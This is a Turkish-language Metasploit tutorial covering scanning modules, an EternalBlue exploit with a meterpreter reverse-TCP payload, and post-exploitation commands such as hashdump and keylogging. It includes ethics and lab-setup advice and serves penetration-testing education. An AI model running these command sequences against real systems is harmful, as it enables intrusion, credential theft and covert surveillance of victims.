# Metasploit Framework Detaylı İnceleme

## Metasploit Nedir?

Metasploit, penetrasyon testleri için geliştirilmiş açık kaynaklı bir güvenlik test çerçevesidir. Rapid7 tarafından geliştirilen bu araç, güvenlik uzmanlarına sistemlerdeki zafiyetleri test etme, exploit geliştirme ve güvenlik değerlendirmesi yapma imkanı sağlar.

## Temel Bileşenleri

### 1. msfconsole
```bash
# Ana komut arayüzü
msfconsole
```
- Modülleri yönetme
- Exploit'leri çalıştırma
- Payload'ları yapılandırma
- Oturumları yönetme

### 2. Veritabanı
- PostgreSQL ile entegre çalışır
- Tarama sonuçlarını saklar
- Host bilgilerini depolar
- Servis bilgilerini tutar

### 3. Modüller
- Exploits: Güvenlik açıklarını kullanır
- Auxiliary: Tarama ve keşif araçları
- Post: Sızma sonrası araçlar
- Payloads: Hedef sistemde çalışacak kodlar
- Encoders: Payload'ları şifreler
- Nops: Exploit stabilizasyonu

## Kullanım Alanları

### 1. Güvenlik Testleri
```bash
# Örnek güvenlik taraması
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run
```

### 2. Zafiyet Analizi
```bash
# Sistemdeki zafiyetleri tespit
use auxiliary/scanner/http/dir_scanner
set RHOSTS target.com
run
```

### 3. Sosyal Mühendislik Testleri
- Phishing kampanyaları
- Sahte giriş sayfaları
- Kötücül dosya oluşturma

### 4. Ağ Güvenliği Değerlendirmesi
```bash
# Ağ servisleri taraması
use auxiliary/scanner/discovery/udp_sweep
set RHOSTS 10.0.0.0/24
run
```

## Kullanım Senaryoları

### Senaryo 1: Web Uygulama Testi
```bash
# 1. Port tarama
use auxiliary/scanner/portscan/tcp
set RHOSTS webapp.local
run

# 2. Web servis analizi
use auxiliary/scanner/http/http_version
set RHOSTS webapp.local
run

# 3. Dizin tarama
use auxiliary/scanner/http/dir_scanner
set RHOSTS webapp.local
run
```

### Senaryo 2: Windows Sistemi Analizi
```bash
# 1. SMB zafiyeti kontrolü
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.10
run

# 2. Exploit çalıştırma
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

### Senaryo 3: Linux Sunucu Testi
```bash
# 1. SSH versiyon tarama
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.20
run

# 2. FTP servis kontrolü
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.20
run
```

## Özel Kullanım Alanları

### 1. IoT Cihaz Testleri
- Varsayılan şifre kontrolleri
- Firmware analizi
- Protokol testleri

### 2. Kablosuz Ağ Testleri
- WEP/WPA kırma testleri
- Evil Twin saldırıları
- Deauth saldırıları

### 3. Endüstriyel Sistemler
- SCADA sistem testleri
- PLC cihaz kontrolleri
- Endüstriyel protokol analizi

### 4. Mobil Uygulama Testleri
- Android APK analizi
- iOS uygulama testleri
- Mobile malware analizi

## Güvenlik Önlemleri

### Test Öncesi
1. Yasal izinlerin alınması
2. Test kapsamının belirlenmesi
3. Yedekleme planlarının hazırlanması

### Test Sırasında
1. İzole test ortamı kullanımı
2. Log kayıtlarının tutulması
3. Sistemlerin sürekli monitör edilmesi

### Test Sonrası
1. Tüm test izlerinin temizlenmesi
2. Detaylı raporlama
3. Güvenlik önerilerinin hazırlanması

## Eğitim ve Geliştirme

### Temel Eğitim
- Network temelleri
- İşletim sistemleri
- Programlama (Ruby, Python)
- Web teknolojileri

### İleri Seviye
- Exploit geliştirme
- Modül yazımı
- Post exploitation
- Custom payload oluşturma


## 1. Kurulum

https://www.alibabacloud.com/blog/what-is-metasploit-how-to-install-metasploit-on-ubuntu_599955


## 2. Metasploit Konsol Komutları

### Temel Konsol Komutları
```bash
help                    # Tüm komutları listeler
search [arama_terimi]   # Modül arama
use [modül_adı]        # Modül seçme
info                    # Modül bilgisi
show options           # Modül seçeneklerini göster
set [opsiyon] [değer]  # Değer atama
run / exploit          # Modülü çalıştırma
```

## 3. Keşif (Information Gathering)

### Port Tarama
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS [hedef_ip]
set PORTS 1-1000
run
```

### Servis Tarama
```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS [hedef_ip]
run
```

## 4. Exploit Kullanımı

### Örnek Exploit Kullanımı
```bash
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [hedef_ip]
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST [kendi_ip]
exploit
```

## 5. Payload Tipleri

### Temel Payload Çeşitleri
* **Reverse Shell**: Hedeften size bağlantı açar
* **Bind Shell**: Hedefte port açar ve dinlemeye alır
* **Meterpreter**: Gelişmiş özelliklere sahip payload

### Meterpreter Temel Komutlar
```bash
sysinfo         # Sistem bilgisi
getuid          # Kullanıcı bilgisi
ps              # Process listesi
migrate [PID]   # Process'e geçiş
hashdump        # Hash'leri dökme
screenshot      # Ekran görüntüsü
```

## 6. Post Exploitation

### Yetki Yükseltme
```bash
use post/windows/gather/smart_hashdump
run

use exploit/windows/local/service_permissions
set SESSION 1
run
```

## 7. Veri Toplama

### Basit Veri Toplama Komutları
```bash
search -f *.pdf    # PDF dosyalarını ara
download [dosya]   # Dosya indirme
upload [dosya]     # Dosya yükleme
keyscan_start      # Keylogger başlatma
keyscan_dump       # Kayıtları görüntüleme
```

## 8. Güvenlik ve Etik

### Önemli Uyarılar
* Sadece izin verilen sistemlerde test yapın
* Test sonuçlarını detaylı raporlayın
* Sistemlerde kalıcı hasar bırakmayın
* Kişisel verilere saygılı olun

## 9. Pratik Yapma

### Lab Ortamı Kurulumu
* VirtualBox veya VMware kullanın
* Metasploitable2 indirin ve kurun
* Windows 7/10 test makinesi hazırlayın

### Örnek Senaryo
```bash
# 1. Hedef keşfi
nmap -sV [hedef_ip]

# 2. Açık servisleri tespit
use auxiliary/scanner/smb/smb_version

# 3. Uygun exploit seçimi
search type:exploit platform:windows

# 4. Exploit çalıştırma
use [exploit_adı]
set RHOSTS [hedef_ip]
exploit
```

## 10. İleri Seviye Konular

### Öğrenilmesi Gereken Konular
* MSFvenom ile özel payload oluşturma
* Exploit geliştirme
* Script yazma (Ruby)
* Anti-virüs bypass teknikleri

## Sonuç

Bu eğitim, Metasploit'un temel kullanımını anlamanıza yardımcı olacaktır. Düzenli pratik yaparak ve güvenli lab ortamlarında çalışarak becerilerinizi geliştirebilirsiniz. 

### Önerilen Kaynaklar
* Metasploit Belgeleri
* Offensive Security Eğitimleri
* CTF platformları
* Güvenli lab ortamları

**Not**: Bu bilgiler sadece eğitim amaçlıdır ve etik sınırlar içerisinde kullanılmalıdır.


# Detaylı Keşif Senaryosu


